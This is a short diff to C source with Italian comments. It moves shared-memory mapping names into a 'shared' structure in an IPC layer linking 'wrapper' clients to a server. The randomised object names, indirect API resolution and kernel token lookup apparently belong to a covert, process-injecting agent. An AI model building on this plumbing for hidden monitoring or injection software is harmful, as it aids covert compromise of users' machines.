@@ -10,8 +10,6 @@
 #define MAX_MSG_LEN 0x400 // Lunghezza di un messaggio
 #define MAX_MSG_NUM 3000 // Massimo numero di messaggi in coda
 #define SHARE_MEMORY_READ_SIZE (WRAPPER_COUNT*WRAPPER_MAX_SHARED_MEM) // Dimensione spazio per la lettura delle configurazioni da parte dei wrapper                                
-extern char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
-extern char SHARE_MEMORY_WRITE_NAME[MAX_RAND_NAME];
 
 // Valori derivati
 #define SHARE_MEMORY_WRITE_SIZE ((MAX_MSG_NUM * sizeof(message_struct))+2)
@@ -84,7 +82,7 @@ static BYTE * __stdcall IPCClientRead(DWORD wrapper_tag)
 
 static DWORD IPCClientRead_setup(DWORD dummy)
 {
-	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_READ, FALSE, SHARE_MEMORY_READ_NAME);
+	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_READ, FALSE, shared.SHARE_MEMORY_READ_NAME);
 	IPCClientRead_data.mem_addr = 0;
 
 	// Se non riesce ad aprire l'oggetto setta mem_addr a NULL e la funzione ritornera' sempre NULL
@@ -193,7 +191,7 @@ static DWORD IPCClientWrite_setup(DWORD dummy)
 	h_krn = GetModuleHandle("kernel32.dll");
 	IPCClientWrite_data.pGetSystemTimeAsFileTime = (GetSystemTimeAsFileTime_t)HM_SafeGetProcAddress(h_krn, "GetSystemTimeAsFileTime");
 
-	h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, SHARE_MEMORY_WRITE_NAME);
+	h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, shared.SHARE_MEMORY_WRITE_NAME);
 	IPCClientWrite_data.mem_addr = 0;
 	IPCClientWrite_data.old_low_part = 0;
 	IPCClientWrite_data.old_hi_part = 0;
@@ -329,13 +327,13 @@ BOOL IPCServerInit()
 	} while(0);
 
 	// WRITE e READ sono invertiti perche' vengono visti dall'ottica del client
-	h_file = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, act_sec_attr, PAGE_READWRITE, 0, SHARE_MEMORY_READ_SIZE, SHARE_MEMORY_READ_NAME);
+	h_file = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, act_sec_attr, PAGE_READWRITE, 0, SHARE_MEMORY_READ_SIZE, shared.SHARE_MEMORY_READ_NAME);
 	if (h_file) {
 		server_mem_addr_write = (BYTE *)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_READ_SIZE);
 		IPC_SHM_Kernel_Object = FindTokenObject(h_file);
 	}
 
-	h_file = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, act_sec_attr, PAGE_READWRITE, 0, SHARE_MEMORY_WRITE_SIZE, SHARE_MEMORY_WRITE_NAME);
+	h_file = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, act_sec_attr, PAGE_READWRITE, 0, SHARE_MEMORY_WRITE_SIZE, shared.SHARE_MEMORY_WRITE_NAME);
 	if (h_file) {
 		if (GetLastError()==ERROR_ALREADY_EXISTS)
 			ret_val = FALSE;
